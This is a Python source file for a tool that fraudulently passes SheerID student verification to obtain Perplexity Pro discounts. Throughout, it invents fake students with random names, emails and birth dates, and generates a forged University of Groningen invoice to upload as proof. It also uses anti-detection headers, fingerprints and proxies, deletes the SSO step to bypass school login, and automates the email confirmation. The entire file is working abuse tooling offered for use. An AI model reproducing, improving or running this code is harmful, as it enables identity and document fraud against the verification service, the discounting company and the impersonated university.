"""
Perplexity AI Student Verification Tool
SheerID Student Verification for Perplexity Pro

Strategy: University of Groningen (NL) + SSO bypass

Author: ThanhNguyxn
"""

import re
import json
import time
import random
import logging
from pathlib import Path
from typing import Dict, Optional, Tuple

import httpx

from . import config
from .img_generator import generate_groningen_invoice
from services.utils.anti_detect import get_headers, get_fingerprint, random_delay, create_session
from services.utils.email_client import EmailClient
import asyncio

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S',
)
logger = logging.getLogger(__name__)

# ============ CONFIG ============
SHEERID_API_URL = "https://services.sheerid.com/rest/v2"
MIN_DELAY = 300
MAX_DELAY = 800


# ============ STATS TRACKING ============
class Stats:
    def __init__(self):
        self.file = Path(__file__).parent / "stats.json"
        self.data = self._load()
    
    def _load(self) -> Dict:
        if self.file.exists():
            try:
                return json.loads(self.file.read_text())
            except:
                pass
        return {"total": 0, "success": 0, "failed": 0, "orgs": {}}
    
    def _save(self):
        self.file.write_text(json.dumps(self.data, indent=2))
    
    def record(self, org: str, success: bool):
        self.data["total"] += 1
        self.data["success" if success else "failed"] += 1
        if org not in self.data["orgs"]:
            self.data["orgs"][org] = {"success": 0, "failed": 0}
        self.data["orgs"][org]["success" if success else "failed"] += 1
        self._save()
    
    def get_rate(self, org: str = None) -> float:
        if org:
            o = self.data["orgs"].get(org, {})
            total = o.get("success", 0) + o.get("failed", 0)
            return o.get("success", 0) / total * 100 if total else 50
        return self.data["success"] / self.data["total"] * 100 if self.data["total"] else 0


stats = Stats()


# ============ UTILITIES ============
FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph",
    "Thomas", "Christopher", "Charles", "Daniel", "Matthew", "Anthony", "Mark",
    "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Susan", "Jessica", "Sarah"
]
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Wilson", "Anderson", "Thomas"
]


def generate_name() -> Tuple[str, str]:
    return random.choice(FIRST_NAMES), random.choice(LAST_NAMES)


def generate_email(first: str, last: str, domain: str) -> str:
    patterns = [
        f"{first[0].lower()}{last.lower()}{random.randint(100, 999)}",
        f"{first.lower()}.{last.lower()}{random.randint(10, 99)}",
    ]
    return f"{random.choice(patterns)}@{domain}"


def generate_birth_date() -> str:
    year = random.randint(2000, 2006)
    month = random.randint(1, 12)
    day = random.randint(1, 28)
    return f"{year}-{month:02d}-{day:02d}"


def format_dob_display(dob: str) -> str:
    """Convert 2005-05-15 to 15 May 2005"""
    months = ["January", "February", "March", "April", "May", "June", 
              "July", "August", "September", "October", "November", "December"]
    parts = dob.split("-")
    if len(parts) == 3:
        year, month, day = parts
        return f"{int(day)} {months[int(month)-1]} {year}"
    return dob


# ============ VERIFIER ============
class SheerIDVerifier:
    """Perplexity Student Verification (Groningen Strategy)"""
    
    def __init__(self, url: str, proxy: str = None):
        self.url = url
        self.vid = self._parse_id(url)
        self.program_id = self._parse_program_id(url) or config.PROGRAM_ID
        self.fingerprint = get_fingerprint()
        
        self.client, self.lib_name = create_session(proxy)
        self.org = config.get_groningen_school()
    
    def __del__(self):
        if hasattr(self, "client"):
            self.client.close()
    
    @staticmethod
    def _parse_id(url: str) -> Optional[str]:
        match = re.search(r"verificationId=([a-f0-9]+)", url, re.IGNORECASE)
        if match:
            return match.group(1)
        match = re.search(r"/verification/([a-f0-9]+)", url, re.IGNORECASE)
        if match:
            return match.group(1)
        return None

    @staticmethod
    def _parse_program_id(url: str) -> Optional[str]:
        match = re.search(r"/verify/([a-f0-9]+)/?", url, re.IGNORECASE)
        return match.group(1) if match else None
    
    @staticmethod
    def parse_verification_id(url: str) -> Optional[str]:
        match = re.search(r"verificationId=([a-f0-9]+)", url, re.IGNORECASE)
        if match:
            return match.group(1)
        return None
    
    def _request(self, method: str, endpoint: str, body: Dict = None) -> Tuple[Dict, int]:
        random_delay()
        try:
            # Get anti-detect headers
            headers = get_headers(for_sheerid=True)
            
            resp = self.client.request(method, f"{SHEERID_API_URL}{endpoint}", 
                                       json=body, headers=headers)
            
             # Handle different response objects
            if hasattr(resp, "json"):
                try:
                    data = resp.json()
                except:
                    data = {}
            else:
                data = {}
                
            return data, resp.status_code
        except Exception as e:
            raise Exception(f"Request failed: {e}")
    
    def _upload_s3(self, url: str, data: bytes) -> bool:
        try:
            resp = self.client.put(url, content=data, headers={"Content-Type": "image/png"}, timeout=60)
            return 200 <= resp.status_code < 300
        except:
            return False
    
    def check_link(self) -> Dict:
        if not self.vid:
            return {"valid": False, "error": "Invalid URL"}
        
        data, status = self._request("GET", f"/verification/{self.vid}")
        if status != 200:
            return {"valid": False, "error": f"HTTP {status}"}
        
        step = data.get("currentStep", "")
        valid_steps = ["collectStudentPersonalInfo", "docUpload", "sso"]
        if step in valid_steps:
            return {"valid": True, "step": step}
        elif step == "success":
            return {"valid": False, "error": "Already verified"}
        elif step == "pending":
            return {"valid": False, "error": "Already pending review"}
        return {"valid": False, "error": f"Invalid step: {step}"}
    
    async def verify(self, proxy: str = None, email_config: Dict = None, **kwargs) -> Dict:
        """Async wrapper for compatibility"""
        return await self._verify_sync(email_config)
    
    async def _verify_sync(self, email_config: Dict = None) -> Dict:
        if not self.vid:
            return {"success": False, "message": "Invalid verification URL"}
        
        email_client = None
        try:
            check_data, check_status = self._request("GET", f"/verification/{self.vid}")
            current_step = check_data.get("currentStep", "") if check_status == 200 else ""
            
            first, last = generate_name()
            
            if email_config and email_config.get("email_address"):
                email = email_config.get("email_address")
                email_client = EmailClient(email_config)
            else:
                email = generate_email(first, last, self.org["domain"])
            
            dob = generate_birth_date()
            dob_display = format_dob_display(dob)
            
            logger.info(f"Student: {first} {last}")
            logger.info(f"Email: {email}")
            logger.info(f"School: {self.org['name']}")
            logger.info(f"ID: {self.vid[:20]}...")
            logger.info(f"Starting step: {current_step}")
            
            logger.info("Step 1: Generating Groningen invoice...")
            doc = generate_groningen_invoice(first, last, dob_display)
            logger.info(f"Size: {len(doc)/1024:.1f} KB")
            
            if current_step == "collectStudentPersonalInfo":
                logger.info("Step 2: Submitting student info...")
                body = {
                    "firstName": first, "lastName": last, "birthDate": dob,
                    "email": email, "phoneNumber": "",
                    "organization": {"id": self.org["id"], "idExtended": self.org["idExtended"], 
                                    "name": self.org["name"]},
                    "deviceFingerprintHash": self.fingerprint,
                    "locale": "en-US",
                    "metadata": {
                        "marketConsentValue": False,
                        "verificationId": self.vid,
                        "refererUrl": f"https://services.sheerid.com/verify/{self.program_id}/?verificationId={self.vid}",
                        "flags": '{"collect-info-step-email-first":"default","doc-upload-considerations":"default","doc-upload-may24":"default","doc-upload-redesign-use-legacy-message-keys":false,"docUpload-assertion-checklist":"default","font-size":"default","include-cvec-field-france-student":"not-labeled-optional"}',
                        "submissionOptIn": "By submitting the personal information above, I acknowledge that my personal information is being collected under the privacy policy of the business from which I am seeking a discount"
                    }
                }
                
                data, status = self._request("POST", f"/verification/{self.vid}/step/collectStudentPersonalInfo", body)
                
                if status != 200:
                    stats.record(self.org["name"], False)
                    return {"success": False, "message": f"Submit failed: {status}"}
                
                if data.get("currentStep") == "error":
                    stats.record(self.org["name"], False)
                    return {"success": False, "message": f"Error: {data.get('errorIds', [])}"}
                
                logger.info(f"Current step: {data.get('currentStep')}")
                current_step = data.get("currentStep", "")
            elif current_step in ["docUpload", "sso"]:
                logger.info("Step 2: Skipping (already past info submission)...")
            
            if current_step in ["sso", "collectStudentPersonalInfo"]:
                logger.info("Step 3: Skipping SSO...")
                self._request("DELETE", f"/verification/{self.vid}/step/sso")
            
            logger.info("Step 4: Uploading document...")
            upload_body = {"files": [{"fileName": "invoice.png", "mimeType": "image/png", "fileSize": len(doc)}]}
            data, status = self._request("POST", f"/verification/{self.vid}/step/docUpload", upload_body)
            
            if not data.get("documents"):
                stats.record(self.org["name"], False)
                return {"success": False, "message": "No upload URL"}
            
            upload_url = data["documents"][0].get("uploadUrl")
            if not self._upload_s3(upload_url, doc):
                stats.record(self.org["name"], False)
                return {"success": False, "message": "Upload failed"}
            
            logger.info("Document uploaded!")
            
            logger.info("Step 5: Completing upload...")
            data, status = self._request("POST", f"/verification/{self.vid}/step/completeDocUpload")
            logger.info(f"Upload completed: {data.get('currentStep', 'pending')}")
            
            # Auto email loop
            if data.get("currentStep") == "emailLoop":
                if email_client:
                    logger.info("Entering email loop...")
                    for i in range(10):
                        link = email_client.wait_for_verification_link(self.vid)
                        if link:
                            match = re.search(r"emailToken=(\d+)", link)
                            if match:
                                token = match.group(1)
                                logger.info(f"Got email token: {token}")
                                data, _ = self._request("POST", f"/verification/{self.vid}/step/emailLoop", {
                                    "emailToken": token,
                                    "deviceFingerprintHash": self.fingerprint
                                })
                                break
                        await asyncio.sleep(5)
            
            stats.record(self.org["name"], True)
            
            return {
                "success": True,
                "pending": True,
                "message": "Dokumen terkirim. Tunggu 24-48 jam untuk review.",
                "verification_id": self.vid,
                "redirect_url": data.get("redirectUrl"),
                "status": data,
            }
            
        except Exception as e:
            stats.record(self.org["name"], False)
            return {"success": False, "message": str(e), "verification_id": self.vid}
        finally:
            if email_client:
                email_client.close()


def main():
    import sys
    
    print("=" * 60)
    print("Perplexity AI Student Verification Tool (Groningen Strategy)")
    print("=" * 60)
    
    if len(sys.argv) > 1:
        url = sys.argv[1]
    else:
        url = input("Enter verification URL: ").strip()
    
    if not url or "sheerid.com" not in url:
        print("Invalid URL. Must contain sheerid.com")
        return
    
    verifier = SheerIDVerifier(url)
    
    check = verifier.check_link()
    if not check.get("valid"):
        print(f"Link Error: {check.get('error')}")
        return
    
    result = verifier._verify_sync()
    
    print()
    print("=" * 60)
    print(f"Status: {'Success' if result['success'] else 'Failed'}")
    print(f"Message: {result['message']}")
    print("=" * 60)


if __name__ == "__main__":
    main()
